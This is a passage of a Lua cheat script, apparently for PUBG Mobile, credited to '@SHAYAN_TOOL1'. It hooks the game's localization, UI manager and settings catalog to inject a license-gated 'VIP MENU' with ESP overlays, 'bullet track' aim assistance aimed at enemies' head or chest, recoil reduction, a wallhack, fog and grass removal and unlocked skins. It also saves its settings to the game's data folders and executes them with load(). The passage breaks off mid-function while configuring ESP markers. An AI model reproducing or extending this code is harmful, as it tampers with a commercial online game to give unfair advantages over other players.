    if not _G.LexusConfig.ShowHeadHPBar then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if Valid(localPlayer.HeadHPBar) and type(localPlayer.HeadHPBar.CreateSceneMark) == "function" then
        localPlayer.HeadHPBar:CreateSceneMark()
    end
end

-- ========================================== 
-- LOST TOMB: QTE System
-- ==========================================
function _G.LostTomb_TryEnterQTE(ID)
    if not _G.LexusConfig.EnableQTESystem then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.TryEnterQTE) == "function" then
        return localPlayer:TryEnterQTE(ID)
    end
    return nil
end

function _G.LostTomb_LeaveQTE(ID)
    if not _G.LexusConfig.EnableQTESystem then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.LeaveQTE) == "function" then
        localPlayer:LeaveQTE(ID)
    end
end

-- ========================================== 
-- LOST TOMB: Poison System
-- ==========================================
function _G.LostTomb_SetPoisonOriginArray(actor, bIsAdd)
    if not _G.LexusConfig.EnablePoisonSystem then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.SetPoisonOriginArray) == "function" then
        localPlayer:SetPoisonOriginArray(actor, bIsAdd)
    end
end

-- ========================================== 
-- LOST TOMB: Supply Box Evolution
-- ==========================================
function _G.LostTomb_ShowSupplyBoxEvolution(EvolutionShowParam)
    if not _G.LexusConfig.EnableSupplyBoxEvolution then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.SetSupplyBoxEvolutionShow) == "function" then
        localPlayer:SetSupplyBoxEvolutionShow(EvolutionShowParam)
    end
    if type(localPlayer.ShowSupplyBoxEvolutionTopTips) == "function" then
        localPlayer:ShowSupplyBoxEvolutionTopTips(EvolutionShowParam)
    end
end

-- ========================================== 
-- LOST TOMB: Weapon Auto Hide
-- ==========================================
function _G.LostTomb_MarkHiddenWeaponActor(Reason, bIsHidden)
    if not _G.LexusConfig.AutoHideWeapon then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.MarkHiddenWeaponActor) == "function" then
        localPlayer:MarkHiddenWeaponActor(Reason, bIsHidden)
    end
end

-- ========================================== 
-- LOST TOMB: Damage Analysis
-- ==========================================
function _G.LostTomb_CreateNewDamageAnalysis(Info)
    if not _G.LexusConfig.EnableDamageAnalysis then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.CreateNewDamageAnalysis) == "function" then
        localPlayer:CreateNewDamageAnalysis(Info)
    end
end

function _G.LostTomb_AddDamageAnalysisInfo(Key, Value)
    if not _G.LexusConfig.EnableDamageAnalysis then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.AddDamageAnalysisInfo) == "function" then
        localPlayer:AddDamageAnalysisInfo(Key, Value)
    end
end

-- ========================================== 
-- LOST TOMB: Max Walk Speed Curve
-- ==========================================
function _G.LostTomb_AddMaxWalkSpeedCurve(Curve)
    if not _G.LexusConfig.EnableMaxWalkSpeedCurve then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.AddMaxWalkSpeedCurve) == "function" then
        localPlayer:AddMaxWalkSpeedCurve(Curve)
    end
end

function _G.LostTomb_RemoveMaxWalkSpeedCurve(Curve)
    if not _G.LexusConfig.EnableMaxWalkSpeedCurve then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.RemoveMaxWalkSpeedCurve) == "function" then
        localPlayer:RemoveMaxWalkSpeedCurve(Curve)
    end
end

-- ========================================== 
-- LOST TOMB: Behind Attack Bonus
-- ==========================================
function _G.LostTomb_CheckIsBehindAttack(VictimActor)
    if not _G.LexusConfig.BehindAttackBonus then return false end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return false end
    
    if type(localPlayer.CheckIsBehindAttack) == "function" then
        return localPlayer:CheckIsBehindAttack(nil, VictimActor)
    end
    return false
end

-- ========================================== 
-- LOST TOMB: Game Start Speed Up
-- ==========================================
function _G.LostTomb_OnGameStartSpeedUp()
    if not _G.LexusConfig.EnableGameStartSpeedUp then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.OnGameStartSpeedUp) == "function" then
        localPlayer:OnGameStartSpeedUp()
    end
end

-- ========================================== 
-- LOST TOMB: Extra Energy Bonus
-- ==========================================
function _G.LostTomb_HandleAddExtraEnergy(SkillMgr, SkillUID, StringEvent)
    if not _G.LexusConfig.ExtraEnergyBonus then return end
    
    local localPlayer = GameplayData.GetPlayerCharacter()
    if not Valid(localPlayer) then return end
    
    if type(localPlayer.HandleAddExtraEnergy) == "function" then
        localPlayer:HandleAddExtraEnergy(SkillMgr, SkillUID, StringEvent)
    end
end

-- HỆ THỐNG LƯU VÀ TẢI SETTING MENU VIP (TỰ ĐỘNG)
-- ========================================== 
local function GetConfigPaths(fileName)
    local paths = {
        "//storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "//storage/emulated/0/Android/data/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "//storage/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "//storage/emulated/0/Android/data/com.rekoo.pubgm/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "//storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "/Documents/ShadowTrackerExtra/Saved/Paks/puffer_temp/" .. fileName,
        "/com.tencent.ig/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "/com.vng.pubgmobile/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "/com.pubg.krmobile/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "/com.rekoo.pubgm/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "/com.pubg.imobile/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "../../ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "../../../ShadowTrackerExtra/Saved/Paks/" .. fileName,
        "../../../../ShadowTrackerExtra/Saved/Paks/" .. fileName,
        fileName
    }
    pcall(function()
        if os and os.getenv then
            local homeDir = os.getenv("HOME")
            if homeDir and homeDir ~= "" then
                table.insert(paths, 1, homeDir .. "/Documents/ShadowTrackerExtra/Saved/Paks/" .. fileName)
                table.insert(paths, 2, homeDir .. "/Documents/ShadowTrackerExtra/Saved/Paks/puffer_temp/" .. fileName)
            end
        end
    end)
    return paths
end

local ConfigFileName = "SHADOW_settings.txt"
_G.LastConfigSaveStr = ""

_G.SaveModSettings = function()
    pcall(function()
        local data = "return {\nLexusConfig = {\n"
        for k, v in pairs(_G.LexusConfig or {}) do
            data = data .. "  [\"" .. tostring(k) .. "\"] = " .. tostring(v) .. ",\n"
        end
        data = data .. "},\nCustomTextData = {\n"
        if _G.LexusState and _G.LexusState.CustomTextData then
            for k, v in pairs(_G.LexusState.CustomTextData) do
                data = data .. "  [\"" .. tostring(k) .. "\"] = " .. tostring(v) .. ",\n"
            end
        end
        data = data .. "}\n}"
        
        if data == _G.LastConfigSaveStr then return end
        _G.LastConfigSaveStr = data

        local paths = GetConfigPaths(ConfigFileName)
        for _, path in ipairs(paths) do
            local file = io.open(path, "w")
            if file then
                file:write(data)
                file:close()
                break
            end
        end
    end)
end

_G.LoadModSettings = function()
    pcall(function()
        local paths = GetConfigPaths(ConfigFileName)
        local content = nil
        for _, path in ipairs(paths) do
            local file = io.open(path, "r")
            if file then
                content = file:read("*a")
                file:close()
                break
            end
        end

        if content then
            local func = load(content)
            if func then
                local savedData = func()
                if savedData and type(savedData) == "table" then
                    if savedData.LexusConfig then
                        for k, v in pairs(savedData.LexusConfig) do
                            _G.LexusConfig[k] = v
                        end
                    end
                    if savedData.CustomTextData then
                        _G.LexusState.CustomTextData = _G.LexusState.CustomTextData or {}
                        for k, v in pairs(savedData.CustomTextData) do
                            _G.LexusState.CustomTextData[k] = v
                        end
                    end
                end
            end
        end
        _G.SaveModSettings() 
    end)
end

local function AutoSaveLoop()
    pcall(function() if _G.SaveModSettings then _G.SaveModSettings() end end)
    pcall(function()
        local okTicker, ticker = pcall(require, "common.time_ticker") 
        if okTicker and ticker and ticker.AddTimerOnce then 
            ticker.AddTimerOnce(3.0, AutoSaveLoop)
        end
    end)
end

if not _G.ModConfigLoaded then
    _G.LoadModSettings()
    AutoSaveLoop()
    _G.ModConfigLoaded = true
end

_G.ReadLiveConfig = function()
    if _G.SaveModSettings then _G.SaveModSettings() end
end

-- ========================================== 
-- HỆ THỐNG MENU VIP NATIVE (FIXED VERSION)
-- ========================================== 

-- ============================================================
-- STEP 1: FAKE TEXT MAP - FEATURE NAMES IN ENGLISH
-- ============================================================
local FakeTextMap = {
    -- Menu Title
    [999000] = "SHAYAN VIP MENU",
    
    -- Main Categories
    [999001] = "★ CUSTOM ESP MENU",
[999002] = "★ AIM - BULLET",
[999003] = "✦ SDK PRO",
[999004] = "✦ VVIP SKINS",
[999005] = "⚠ BAN SECTION (RISKY)",
[999006] = "✦ LOST TOMB FEATURES",
[999700] = "◆ VVIP SKINS",
[999701] = "• Mod Skin ( LOBBY + INGAME )",
[999702] = "• Skin DeadBox",
[999703] = "• Skin Attachment",
[999704] = "• Kill Counter UI",
[999705] = "• Kill Message",

-- ESP Features
[999100] = "◆ ESP SKELETON BOX",
[999101] = "• ESP ENEMY DISTANCE",
[999102] = "• ESP HEALTH BAR",
[999103] = "• ESP HIT MARK",
[999104] = "• ESP BOX",
[999105] = "• ESP SKELETON ONLY",
[999106] = "• ESP ENEMIES INFO",
[999107] = "• ESP GREEN ANTENNA",
[999108] = "• ESP ENEMY (RED AURA)",
[999109] = "• COLOR SIZE",

-- Aimbot Features

[999212] = "• KICK ADS RECOIL",

[999214] = "• SMALL CROSSHERE",

[999219] = "• AIM TOUCH ENABLE",
[999220] = "• HIPFIRE ENABLE",
[999221] = "• SHOTGUN ENABLE",
[999222] = "• SCOPE ALL ENABLE",
[999223] = "• SNIPER ENABLE",

-- Extra Features
[999300] = "◆ CUSTOM IPAD VIEW",
[999301] = "• IPAD FOV",
[999302] = "• 165 REAL FPS",
[999303] = "• WALLHACK REAL",
[999305] = "• BLACK SKY",
[999306] = "• REMOVE FOG",
[999307] = "• REMOVE GRASS",
[999308] = "• WALL CLIMB",
[999309] = "• FAST CAR SPEED",

-- Skin Features
[999400] = "◆ VIP MOD SKINS ACTIVATED",
[999430] = "• RISK FUNCTION BT",
[999431] = "  └ BT FOV (0-100)",
[999432] = "  └ BT MAX DIST (0-100)",
[999433] = "  └ BT TARGET (1=Head 2=Chest 3=Leg)",
[999401] = "• ALL X SUITS",
[999402] = "• ALL BAG SKINS",
[999403] = "• ALL HELMET SKINS",
[999404] = "• M416",
[999405] = "• AKM",
[999406] = "• SCAR-L",
[999407] = "• M762",
[999408] = "• AUG",
[999409] = "• UMP45",
[999410] = "• UZI",
[999411] = "• GROZA",
[999412] = "• S12K",
[999413] = "• DBS",
[999414] = "• DACIA",
[999415] = "• UAZ",
[999416] = "• COUPE RB",
[999417] = "• BUGGY",
[999418] = "• MIRADO",

-- Lost Tomb Features

}
-- ============================================================
-- STEP 2: LOCUTIL HOOK
-- ============================================================
function HookLocUtil()
    local LocUtil = _G.LocUtil
    if not LocUtil and package.loaded["client.common.LocUtil"] then
        LocUtil = require("client.common.LocUtil")
    end
    if not LocUtil then
        pcall(function() LocUtil = require("client.common.LocUtil") end)
    end
    if LocUtil and not LocUtil._IsModMenuHooked then
        local old = LocUtil.GetLocalizeResStr
        LocUtil.GetLocalizeResStr = function(id)
            if type(id) == "string" and not tonumber(id) then
                return id
            end
            local nid = tonumber(id) or id
            if FakeTextMap[nid] then
                return FakeTextMap[nid]
            end
            if FakeTextMap[id] then
                return FakeTextMap[id]
            end
            return old(id)
        end
        LocUtil._IsModMenuHooked = true
        print("[MENU FIX] LocUtil hooked successfully!")
    end
end

-- ============================================================
-- STEP 3: MENU REGISTER
-- ============================================================
_G.InitModMenuTab = function()
    if not (_G.IsLicenseOK and _G.IsLicenseOK()) then
        return false
    end
    _G.ModMenuUnlocked = true

    -- First hook LocUtil (re-apply after FakeTextMap updates)
    pcall(function()
        local L = _G.LocUtil or package.loaded["client.common.LocUtil"]
        if L then L._IsModMenuHooked = nil end
        if _G.UIManager then _G.UIManager._IsModMenuHooked = nil end
    end)
    HookLocUtil()
    
    local SettingPageDefine = require("client.logic.NewSetting.SettingPageDefine")
    local SettingCatalog = require("client.logic.NewSetting.SettingCatalog")
    local AliasMap = require("client.slua.umg.NewSetting.Item.AliasMap")
    
    -- ============================================================
    -- ESP STACK
    -- ============================================================
    local StackESP = {
        { UI = AliasMap.Title, Text = 999001 },



        {
            Key = "ModMenu_ESP1", UI = AliasMap.Switcher,
            Text = 999100,
            GetFunc = function() return _G.LexusConfig.EspVip end,
            SetFunc = function(_, v) _G.LexusConfig.EspVip = v; return true end
        },
        {
            Key = "ModMenu_ESP2", UI = AliasMap.Switcher,
            Text = 999101,
            GetFunc = function() return _G.LexusConfig.EspDistance end,
            SetFunc = function(_, v) _G.LexusConfig.EspDistance = v; return true end
        },
        {
            Key = "ModMenu_ESP3", UI = AliasMap.Switcher,
            Text = 999102,
            GetFunc = function() return _G.LexusConfig.EspVipPro end,
            SetFunc = function(_, v) _G.LexusConfig.EspVipPro = v; return true end
        },
        {
            Key = "ModMenu_ESP4", UI = AliasMap.Switcher,
            Text = 999103,
            GetFunc = function() return _G.LexusConfig.EspRadar end,
            SetFunc = function(_, v) _G.LexusConfig.EspRadar = v; return true end
        },
        {
            Key = "ModMenu_ESP5", UI = AliasMap.Switcher,
            Text = 999104,
            GetFunc = function() return _G.LexusConfig.EspLoai5 end,
            SetFunc = function(_, v) _G.LexusConfig.EspLoai5 = v; return true end
        },
        {
            Key = "ModMenu_ESP6", UI = AliasMap.Switcher,
            Text = 999105,
            GetFunc = function() return _G.LexusConfig.EspLoai6 end,
            SetFunc = function(_, v) _G.LexusConfig.EspLoai6 = v; return true end
        },
        {
            Key = "ModMenu_ESP7", UI = AliasMap.Switcher,
            Text = 999106,
            GetFunc = function() return _G.LexusConfig.EspLoai7 end,
            SetFunc = function(_, v) _G.LexusConfig.EspLoai7 = v; return true end
        },
        {
            Key = "ModMenu_ESPAntenna", UI = AliasMap.Switcher,
            Text = 999107,
            GetFunc = function() return _G.LexusConfig.EspAntenna end,
            SetFunc = function(_, v) _G.LexusConfig.EspAntenna = v; return true end
        },
        {
            Key = "ModMenu_ESPOutline_Ex", UI = AliasMap.TitleSwitcher,
            Text = 999108, ExpandIndex = 0,
            GetFunc = function() return _G.LexusConfig.EspOutline end,
            SetFunc = function(_, v) _G.LexusConfig.EspOutline = v; return true end
        },
        {
            Key = "ModMenu_ESPOutline_Thickness", UI = AliasMap.Slider,
            Text = 999109, ExpandHandle = "ModMenu_ESPOutline_Ex",
            MinValue = 1, MaxValue = 20, min = 1, max = 20,
            GetFunc = function() return _G.LexusConfig.OutlineThickness or 10 end,
            SetFunc = function(_, v) _G.LexusConfig.OutlineThickness = v; return true end
        },
    }

    -- ============================================================
    -- AIMBOT STACK
    -- ============================================================
    local StackAimbot = {
        { UI = AliasMap.Title, Text = 999002 },
                -- NEW MENU BT (lobby + match)
        {
            Key = "ModMenu_BulletTrack", UI = AliasMap.TitleSwitcher,
            Text = 999430, ExpandIndex = 0,
            GetFunc = function() return _G.LexusConfig.BulletTrack end,
            SetFunc = function(_, v)
                _G.LexusConfig.BulletTrack = v
                -- [FIX] force sync setelah toggle
                if _G.SyncBulletTrackConfig then _G.SyncBulletTrackConfig() end
                return true
            end
        },
        {
            -- 0-100 = pixel radius langsung (1 step = 1px)
            Key = "ModMenu_BT_FOV", UI = AliasMap.Slider,
            Text = 999431, ExpandHandle = "ModMenu_BulletTrack",
            MinValue = 0, MaxValue = 100, min = 0, max = 100,
            GetFunc = function()
                local fov = tonumber(_G.LexusConfig.BulletTrackFOV) or 80
                if fov < 0 then fov = 0 end
                if fov > 100 then fov = 100 end
                return math.floor(fov + 0.5)
            end,
            SetFunc = function(_, v)
                v = tonumber(v) or 0
                if v < 0 then v = 0 elseif v > 100 then v = 100 end
                _G.LexusConfig.BulletTrackFOV = v
                if _G.LexusState and _G.LexusState.CustomTextData then
                    _G.LexusState.CustomTextData.BtFOV = v
                end
                if _G.SyncBulletTrackConfig then _G.SyncBulletTrackConfig() end
                return true
            end
        },
        {
            -- 0-100 slider → 0-500m (tiap 1 step = +5m)
            Key = "ModMenu_BT_MaxDist", UI = AliasMap.Slider,
            Text = 999432, ExpandHandle = "ModMenu_BulletTrack",
            MinValue = 0, MaxValue = 100, min = 0, max = 100,
            GetFunc = function()
                local d = tonumber(_G.LexusConfig.BulletTrackMaxDist) or 150
                local step = math.floor((d / 5) + 0.5)
                if step < 0 then step = 0 end
                if step > 100 then step = 100 end
                return step
            end,
            SetFunc = function(_, v)
                v = tonumber(v) or 0
                if v < 0 then v = 0 elseif v > 100 then v = 100 end
                _G.LexusConfig.BulletTrackMaxDist = v * 5
                if _G.LexusState and _G.LexusState.CustomTextData then
                    _G.LexusState.CustomTextData.BtMaxDist = _G.LexusConfig.BulletTrackMaxDist
                end
                if _G.SyncBulletTrackConfig then _G.SyncBulletTrackConfig() end
                return true
            end
        },
        {
            -- 1=Head / 2=Chest / 3=Auto (head>chest>pelvis)
            Key = "ModMenu_BT_Target", UI = AliasMap.Slider,
            Text = 999433, ExpandHandle = "ModMenu_BulletTrack",
            MinValue = 1, MaxValue = 3, min = 1, max = 3,
            GetFunc = function()
                -- [FIX] reverse map dari BONE_PRIORITY ke slider 1-3
                local boneIdx = math.floor(tonumber(_G.LexusConfig.BulletTrackTarget) or 2)
                local menuVal = ({[1]=1,[2]=2,[3]=3,[4]=3})[boneIdx] or 2
                return menuVal
            end,
            SetFunc = function(_, v)
                v = math.floor(tonumber(v) or 2)
                if v < 1 then v = 1 end
                if v > 3 then v = 3 end
                -- [FIX] map menu 1/2/3 ke BONE_PRIORITY index 1/2/4
                -- 1=Head, 2=Chest, 3=Auto(head>chest>pelvis) → index 4
                local boneIdx = ({[1]=1,[2]=2,[3]=4})[v] or 2
                _G.LexusConfig.BulletTrackTarget = boneIdx
                if _G.LexusState and _G.LexusState.CustomTextData then
                    _G.LexusState.CustomTextData.BtAimPriority = boneIdx
                end
                return true
            end
        },

        {
            Key = "ModMenu_LessShake", UI = AliasMap.Switcher,
            Text = 999212,
            GetFunc = function() return _G.LexusConfig.LessShake end,
            SetFunc = function(_, v) _G.LexusConfig.LessShake = v; return true end
        },

        {
            Key = "ModMenu_Crosshair", UI = AliasMap.Switcher,
            Text = 999214,
            GetFunc = function() return _G.LexusConfig.Crosshair end,
            SetFunc = function(_, v) _G.LexusConfig.Crosshair = v; return true end
        },

        {
            Key = "ModMenu_AT_Ex", UI = AliasMap.TitleSwitcher,
            Text = 999219, ExpandIndex = 0,
            GetFunc = function() return _G.LexusConfig.AimTouchEnable end,
            SetFunc = function(_, v) _G.LexusConfig.AimTouchEnable = v; return true end
        },
        {
            Key = "ModMenu_AT_Hip_Ex", UI = AliasMap.TitleSwitcher,
            Text = 999220,
            GetFunc = function() return _G.LexusConfig.AimTouchHipfire end,
            SetFunc = function(_, v) _G.LexusConfig.AimTouchHipfire = v; return true end
        },
        {
           Key = "ModMenu_AT_SG_Ex", UI = AliasMap.TitleSwitcher,
           Text = 999221,
           GetFunc = function() return _G.LexusConfig.AimTouchSG end,
           SetFunc = function(_, v) _G.LexusConfig.AimTouchSG = v; return true end
        },
        {
           Key = "ModMenu_AT_ScopeAll_Ex", UI = AliasMap.TitleSwitcher,
           Text = 999222,
           GetFunc = function() return _G.LexusConfig.AimTouchScopeAll end,
           SetFunc = function(_, v) _G.LexusConfig.AimTouchScopeAll = v; return true end
        },
        {
           Key = "ModMenu_AT_Sniper_Ex", UI = AliasMap.TitleSwitcher,
           Text = 999223,
           GetFunc = function() return _G.LexusConfig.AimTouchScopeSniper end,
           SetFunc = function(_, v) _G.LexusConfig.AimTouchScopeSniper = v; return true end
        },
    }

    -- ============================================================
    -- EXTRA FEATURES STACK
    -- ============================================================
    local StackCombat = {

        { UI = AliasMap.Title, Text = 999003 },
        {
            Key = "ModMenu_Ipad_Ex", UI = AliasMap.TitleSwitcher,
            Text = 999300, ExpandIndex = 0,
            GetFunc = function() return _G.LexusConfig.IpadView end,
            SetFunc = function(_, v) _G.LexusConfig.IpadView = v; return true end
        },
        {
            Key = "ModMenu_Ipad_FOV", UI = AliasMap.Slider,
            Text = 999301, ExpandHandle = "ModMenu_Ipad_Ex",
            MinValue = 1, MaxValue = 100, min = 1, max = 100,
            GetFunc = function() return (_G.LexusState.CustomTextData.IpadViewFOV or 120) - 90 end,
            SetFunc = function(_, v) _G.LexusState.CustomTextData.IpadViewFOV = 90 + v; return true end
        },
        {
            Key = "ModMenu_165FPS", UI = AliasMap.Switcher,
            Text = 999302,
            GetFunc = function() return _G.LexusConfig.UnlockFPS end,
            SetFunc = function(_, v)
            _G.LexusConfig.UnlockFPS = v
            if _G.LexusState then _G.LexusState.GraphicsUnlocked = false end
            if v then
                pcall(function() if _G.ForceApply165FPS then _G.ForceApply165FPS() end end)
                pcall(function() if InitializeGraphicsUnlock then InitializeGraphicsUnlock() end end)
            end
            return true
        end
        },
        {
            Key = "ModMenu_WallColor", UI = AliasMap.Switcher,
            Text = 999303,
            GetFunc = function() return _G.LexusConfig.WallXuyenTuong end,
            SetFunc = function(_, v) _G.LexusConfig.WallXuyenTuong = v; _G.LexusConfig.ColorBodyV2 = v; return true end
        },

        {
            Key = "ModMenu_BlackSky", UI = AliasMap.Switcher,
            Text = 999305,
            GetFunc = function() return _G.LexusConfig.BlackSky end,
            SetFunc = function(_, v) _G.LexusConfig.BlackSky = v; return true end
        },
        {
            Key = "ModMenu_RemoveFog", UI = AliasMap.Switcher,
            Text = 999306,
            GetFunc = function() return _G.LexusConfig.RemoveFog end,
            SetFunc = function(_, v) _G.LexusConfig.RemoveFog = v; return true end
        },
        {
            Key = "ModMenu_RemoveGrass", UI = AliasMap.Switcher,
            Text = 999307,
            GetFunc = function() return _G.LexusConfig.RemoveGrass end,
            SetFunc = function(_, v) _G.LexusConfig.RemoveGrass = v; return true end
        },
    }

    -- ============================================================
    -- LOST TOMB STACK
    -- ============================================================
    
    local StackSkin = {
        { UI = AliasMap.Title, Text = 999700 },
        { Key = "ModMenu_ModSkin", UI = AliasMap.TitleSwitcher, Text = 999701, ExpandIndex = 0,
          GetFunc = function() return _G.LexusConfig.ModSkin end,
          SetFunc = function(_, v)
            _G.LexusConfig.ModSkin = v
            _G._PUT_MatchSkinReady = false
            if _G.PUT_SaveConfig then _G.PUT_SaveConfig() end
            return true
          end },
        { Key = "ModMenu_SkinDeadBox", UI = AliasMap.Switcher, Text = 999702, ExpandHandle = "ModMenu_ModSkin",
          GetFunc = function() return _G.LexusConfig.SkinDeadBox end,
          SetFunc = function(_, v) _G.LexusConfig.SkinDeadBox = v if _G.PUT_SaveConfig then _G.PUT_SaveConfig() end return true end },
        { Key = "ModMenu_SkinAttachment", UI = AliasMap.Switcher, Text = 999703, ExpandHandle = "ModMenu_ModSkin",
          GetFunc = function() return _G.LexusConfig.SkinAttachment end,
          SetFunc = function(_, v) _G.LexusConfig.SkinAttachment = v if _G.PUT_SaveConfig then _G.PUT_SaveConfig() end return true end },
        { Key = "ModMenu_KillCountUI", UI = AliasMap.Switcher, Text = 999704, ExpandHandle = "ModMenu_ModSkin",
          GetFunc = function() return _G.LexusConfig.KillCountUI end,
          SetFunc = function(_, v) _G.LexusConfig.KillCountUI = v if _G.PUT_SaveConfig then _G.PUT_SaveConfig() end return true end },
        { Key = "ModMenu_KillMessage", UI = AliasMap.Switcher, Text = 999705, ExpandHandle = "ModMenu_ModSkin",
          GetFunc = function() return _G.LexusConfig.KillMessage end,
          SetFunc = function(_, v) _G.LexusConfig.KillMessage = v if _G.PUT_SaveConfig then _G.PUT_SaveConfig() end return true end },
    }



    -- ============================================================
    -- REGISTER MENU
    -- ============================================================
    -- Always rebuild so new items (BT) appear in lobby + match
    SettingPageDefine.MyModMenu = {
        Key = "MyModMenu",
        Text = 999000,
        UIKey = "Setting_Page_Privacy",
        Category = {
            { Key = "Cat_ESP", Text = 999001, Stack = StackESP },
            { Key = "Cat_Combat", Text = 999003, Stack = StackCombat },
    
        }
    }
    do
        local hasMenu = false
        if type(SettingCatalog) == "table" then
            for _, page in ipairs(SettingCatalog) do
                if type(page) == "table" and page.Key == "MyModMenu" then
                    hasMenu = true
                    break
                end
            end
            if not hasMenu then
                table.insert(SettingCatalog, SettingPageDefine.MyModMenu)
            else
                -- replace existing entry with rebuilt menu (has BT)
                for idx, page in ipairs(SettingCatalog) do
                    if type(page) == "table" and page.Key == "MyModMenu" then
                        SettingCatalog[idx] = SettingPageDefine.MyModMenu
                        break
                    end
                end
            end
        end
        print("[MENU FIX] Menu registered/updated (BT included)!")
    end

    -- ============================================================
    -- HOOK UIMANAGER
    -- ============================================================
    local UIManager = _G.UIManager
    if UIManager and not UIManager._IsModMenuHooked then
        local old = UIManager.ShowUI
        UIManager.ShowUI = function(config, ...)
            local args = {...}
            local n = select('#', ...)
            
            if config and config.keyName and string.find(string.lower(config.keyName), "setting_main") then
                if not (_G.IsLicenseOK and _G.IsLicenseOK()) then
                    local catalog = args[1]
                    if type(catalog) == "table" then
                        for i = #catalog, 1, -1 do
                            local page = catalog[i]
                            if type(page) == "table" and page.Key == "MyModMenu" then
                                table.remove(catalog, i)
                            end
                        end
                    end
                end
                local catalog = args[1]
                if type(catalog) == "table" then
                    local has = false
                    for _, page in ipairs(catalog) do
                        if type(page) == "table" and page.Key == "MyModMenu" then
                            has = true
                            break
                        end
                    end
                    if _G.IsLicenseOK and _G.IsLicenseOK() then
                        if not has and SettingPageDefine.MyModMenu then
                            table.insert(catalog, 1, SettingPageDefine.MyModMenu)
                        end
                    end
                end
            end
            local table_unpack = table.unpack or unpack
            return old(config, table_unpack(args, 1, n))
        end
        UIManager._IsModMenuHooked = true
        print("[MENU FIX] UIManager hooked successfully!")
    end

    -- Extra: hook module SettingCatalog if it has GetPageList / pages
    pcall(function()
        local SC = SettingCatalog
        if type(SC) == "table" then
            if type(SC.GetCatalog) == "function" and not SC._PUT_hooked then
                local orig = SC.GetCatalog
                SC.GetCatalog = function(...)
                    local list = orig(...)
                    if type(list) == "table" then
                        if not (_G.IsLicenseOK and _G.IsLicenseOK()) then
                            for i = #list, 1, -1 do
                                local p = list[i]
                                if type(p) == "table" and p.Key == "MyModMenu" then
                                    table.remove(list, i)
                                end
                            end
                        elseif SettingPageDefine.MyModMenu then
                            local has = false
                            for _, p in ipairs(list) do
                                if type(p) == "table" and p.Key == "MyModMenu" then has = true break end
                            end
                            if not has then table.insert(list, 1, SettingPageDefine.MyModMenu) end
                        end
                    end
                    return list
                end
                SC._PUT_hooked = true
            end
        end
    end)

    -- Retry inject several times (settings load late)
    pcall(function()
        local ticker = require("common.time_ticker")
        if not ticker or not ticker.AddTimerOnce then return end
        for _, d in ipairs({1, 2, 4, 8, 15}) do
            ticker.AddTimerOnce(d, function()
                pcall(function()
                    if (_G.IsLicenseOK and _G.IsLicenseOK())
                        and type(SettingCatalog) == "table"
                        and SettingPageDefine.MyModMenu then
                        local has = false
                        for _, page in ipairs(SettingCatalog) do
                            if type(page) == "table" and page.Key == "MyModMenu" then has = true break end
                        end
                        if not has then table.insert(SettingCatalog, 1, SettingPageDefine.MyModMenu) end
                    end
                end)
            end)
        end
    end)
end

-- ============================================================
-- STEP 4: SHOW MENU ON STARTUP
-- ============================================================
_G.InitModMenuTab()
print("[MENU FIX] Menu fixed successfully!")
print("[CREDIT] MOD | @SHAYAN_TOOL1")
print("[INFO] PUT VIP | @SHAYAN_TOOL1")

-- ========================================== 
-- KHỞI TẠO HỆ THỐNG ESP (GỐC)
-- ========================================== 
local function InitializeNativeESP() 
    if _G.LexusState.NativeESPReady then return end
    pcall(function() 
        local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools") 
        local currentMarkCfg = GamePlayTools.GetCurrentConfig("ScreenMarkConfig") 
        local function ApplyCfg(cfg)
            if not cfg then return end 
            if cfg[1006] then
            cfg[1006].bBindBlocked = true
            cfg[1006].bBindOutScreen = true
            cfg[1006].MaxWidgetNum = 99
            cfg[1006].MaxShowDistance = 6000000
            cfg[1006].bScaleByDistance = false
            -- HP marker di ATAS kepala
            cfg[1006].BindSocketName = "Head"
            cfg[1006].bUseLuaWorldSocketName = true
            -- ESP1: naik di atas kepala
            cfg[1006].WorldPositionOffset = FVector(0, 0, 110) 
            end 
            if cfg[1003] then 
                cfg[1003].bBindBlocked = true;
                cfg[1003].bBindOutScreen = true; 
                cfg[1003].MaxWidgetNum = 99
                cfg[1003].MaxShowDistance = 6000000; 
                cfg[1003].bScaleByDistance = false
